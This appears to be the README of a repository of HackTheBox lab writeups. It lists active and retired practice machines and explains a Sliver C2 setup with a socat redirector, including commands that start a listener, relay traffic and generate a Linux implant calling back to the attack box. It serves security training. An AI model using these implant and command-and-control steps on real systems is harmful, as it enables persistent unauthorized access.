# HackTheBox Writeups

A collection of detailed writeups for HackTheBox machines.

## Structure

Each machine has its own directory containing:
- `README.md` - Brief overview (spoiler-free)
- `writeup.md` - Full detailed walkthrough (encrypted while machine is active)
- `writeup.pdf` - Password-protected PDF version
- `files/` - Supporting files, scripts, configs

## Active Machines (Locked)

Writeups for active machines are encrypted to comply with HTB's rules. They will be unlocked after the machine retires.

| Machine | OS | Difficulty | Status | Unlock Date |
|---------|-----|------------|--------|-------------|
| [CCTV](./CCTV/) | Linux | Easy | Active | TBD |
| [Overwatch](./Overwatch/) | Windows | Medium | Active | TBD |
| [Facts](./Facts/) | Linux | Easy | Active | TBD |
| [AirTouch](./AirTouch/) | Linux | Medium | Active | TBD |

## Retired Machines (Unlocked)

| Machine | OS | Difficulty | Completed | Key Techniques |
|---------|-----|------------|-----------|----------------|
| [Cap](./Cap/) | Linux | Easy | March 2026 | IDOR, PCAP Analysis, Linux Capabilities |

## Unlocking Writeups

After a machine retires, the writeup will be decrypted and made available. Password-protected PDFs use the format: `HTB{machine_name_retirement_date}` (e.g., `HTB{AirTouch_2026-06-15}`)

## C2 Setup for HackTheBox

When practicing attack chains on HTB, we use [Sliver C2](https://sliver.sh/) to simulate proper adversary infrastructure. This provides:

- Persistent access across exploitation phases
- Proper session management for multi-stage attacks
- Experience with real C2 frameworks used in engagements

### Why a Redirector?

HTB's VPN assigns a dynamic IP (10.10.15.x) that changes between sessions. Running C2 directly on the attack box means regenerating implants every time. A redirector solves this:

```
Target (10.129.x.x) --> Kali VPN (10.10.15.x:443) --> Sliver C2 (192.168.x.x:4443)
```

### Quick Setup

```bash
# On Sliver C2 server - start listener
sliver > mtls --lport 4443

# On Kali - run socat redirector
sudo socat TCP-LISTEN:443,fork,bind=10.10.15.x,reuseaddr TCP:<C2_SERVER>:4443

# Generate implant pointing to Kali's VPN IP
sliver > generate --mtls 10.10.15.x:443 --os linux --arch amd64 --save /tmp/implant
```

See [Socat C2 Redirector Guide](./docs/socat-c2-redirector.md) for full documentation with diagrams.

## Disclaimer

These writeups are for educational purposes only. Do not use these techniques on systems without explicit permission.

## Author

Created by security enthusiast for the cybersecurity community.

## License

This project is licensed under the MIT License - see individual writeups for attribution requirements.
